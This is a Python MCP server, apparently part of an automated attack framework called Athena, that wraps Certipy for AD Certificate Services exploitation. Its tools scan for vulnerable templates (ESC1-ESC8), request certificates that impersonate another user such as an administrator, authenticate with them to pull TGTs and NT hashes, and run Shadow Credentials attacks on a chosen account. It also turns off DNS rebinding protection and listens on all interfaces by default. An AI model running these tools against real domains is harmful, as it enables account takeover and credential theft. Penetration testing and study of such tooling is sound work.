"""certipy-ad MCP Server for Athena.

Certipy-based AD Certificate Services (AD CS) vulnerability exploitation (ESC1-ESC8).
Returns JSON with {"facts": [{"trait": ..., "value": ...}]}
to integrate with Athena's fact collection pipeline.
"""

import asyncio
import json
import re

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-certipy-ad", transport_security=_security)


async def _run_command(cmd: list[str], timeout: int = 180) -> tuple[str, str, int]:
    """Run subprocess asynchronously with timeout."""
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return "", "Command timed out", -1
    return (
        stdout.decode(errors="replace"),
        stderr.decode(errors="replace"),
        proc.returncode or 0,
    )


@mcp.tool()
async def certipy_find(
    target_dc: str,
    username: str,
    password: str,
    domain: str,
) -> str:
    """Scan AD CS environment for exploitable certificate templates (ESC1-ESC8).

    Args:
        target_dc: Domain Controller IP or hostname
        username: Domain username
        password: Domain password
        domain: AD domain name

    Returns:
        JSON with facts: ad.vulnerable_template, ad.esc_type, ad.ca_name
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "certipy", "find",
            "-u", f"{username}@{domain}",
            "-p", password,
            "-dc-ip", target_dc,
            "-vulnerable",
            "-stdout",
        ]

        stdout, stderr, rc = await _run_command(cmd, timeout=300)
        combined = stdout + stderr

        ca_pattern = re.compile(r"CA Name\s*:\s*(.+)", re.IGNORECASE)
        for match in ca_pattern.finditer(combined):
            facts.append({"trait": "ad.ca_name", "value": match.group(1).strip()})

        template_pattern = re.compile(r"Template Name\s*:\s*(.+)", re.IGNORECASE)
        for match in template_pattern.finditer(combined):
            facts.append({"trait": "ad.vulnerable_template", "value": match.group(1).strip()})

        esc_pattern = re.compile(r"(ESC\d+)", re.IGNORECASE)
        esc_types = set()
        for match in esc_pattern.finditer(combined):
            esc_types.add(match.group(1).upper())
        for esc in sorted(esc_types):
            facts.append({"trait": "ad.esc_type", "value": esc})

        json_match = re.search(r"Saved .+ to '(.+\.json)'", combined)
        if json_match:
            try:
                with open(json_match.group(1)) as fh:
                    cert_data = json.load(fh)
                    templates = cert_data.get("Certificate Templates", {})
                    for tname, tdata in templates.items():
                        for vuln_name in tdata.get("Vulnerabilities", {}):
                            facts.append({"trait": "ad.esc_type", "value": f"{tname}:{vuln_name}"})
            except (json.JSONDecodeError, OSError, KeyError):
                pass

        return json.dumps({"facts": facts, "raw_output": combined[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def certipy_request(
    target_dc: str,
    username: str,
    password: str,
    domain: str,
    template: str,
    upn: str = "",
) -> str:
    """Request a malicious certificate (exploiting ESC1/ESC2 etc.).

    Args:
        target_dc: Domain Controller IP or hostname
        username: Domain username
        password: Domain password
        domain: AD domain name
        template: Vulnerable certificate template name
        upn: UPN to impersonate (e.g. administrator@domain)

    Returns:
        JSON with facts: ad.certificate_pfx, ad.impersonated_user
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "certipy", "req",
            "-u", f"{username}@{domain}",
            "-p", password,
            "-dc-ip", target_dc,
            "-template", template,
        ]
        if upn:
            cmd.extend(["-upn", upn])

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        pfx_match = re.search(r"Saved certificate and private key to '(.+\.pfx)'", combined)
        if pfx_match:
            facts.append({"trait": "ad.certificate_pfx", "value": pfx_match.group(1)})

        if upn:
            facts.append({"trait": "ad.impersonated_user", "value": upn})

        if "Successfully" in combined or pfx_match:
            facts.append({
                "trait": "ad.certificate_pfx",
                "value": f"template={template},upn={upn or username}",
            })

        return json.dumps({"facts": facts, "raw_output": combined[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def certipy_auth(
    target_dc: str,
    pfx_path: str,
    domain: str,
) -> str:
    """Authenticate using a malicious certificate (get TGT + NT hash).

    Args:
        target_dc: Domain Controller IP or hostname
        pfx_path: Path to the PFX certificate file
        domain: AD domain name

    Returns:
        JSON with facts: credential.hash, credential.certificate_auth
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "certipy", "auth",
            "-pfx", pfx_path,
            "-dc-ip", target_dc,
            "-domain", domain,
        ]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        hash_match = re.search(r"NT hash\s*:\s*([a-fA-F0-9]{32})", combined, re.IGNORECASE)
        if hash_match:
            facts.append({"trait": "credential.hash", "value": hash_match.group(1)})

        if "Got TGT" in combined or ".ccache" in combined:
            facts.append({"trait": "credential.certificate_auth", "value": f"TGT obtained via {pfx_path}"})

        user_match = re.search(r"Using principal:\s*(\S+)", combined)
        if user_match:
            facts.append({"trait": "credential.certificate_auth", "value": f"principal={user_match.group(1)}"})

        return json.dumps({"facts": facts, "raw_output": combined[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def certipy_shadow(
    target_dc: str,
    username: str,
    password: str,
    domain: str,
    target_user: str,
) -> str:
    """Shadow Credentials attack (Key Trust abuse).

    Args:
        target_dc: Domain Controller IP or hostname
        username: Attacker domain username
        password: Attacker domain password
        domain: AD domain name
        target_user: Target user account for shadow credentials

    Returns:
        JSON with facts: credential.shadow_credential, credential.hash
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "certipy", "shadow", "auto",
            "-u", f"{username}@{domain}",
            "-p", password,
            "-dc-ip", target_dc,
            "-account", target_user,
        ]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        if "Successfully" in combined:
            facts.append({
                "trait": "credential.shadow_credential",
                "value": f"Shadow credential set for {target_user}",
            })

        hash_match = re.search(r"NT hash\s*:\s*([a-fA-F0-9]{32})", combined, re.IGNORECASE)
        if hash_match:
            facts.append({"trait": "credential.hash", "value": f"{target_user}:{hash_match.group(1)}"})

        pfx_match = re.search(r"Saved .+ to '(.+\.pfx)'", combined)
        if pfx_match:
            facts.append({"trait": "credential.shadow_credential", "value": f"pfx={pfx_match.group(1)}"})

        return json.dumps({"facts": facts, "raw_output": combined[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--transport",
        default="stdio",
        choices=["stdio", "sse", "streamable-http"],
    )
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
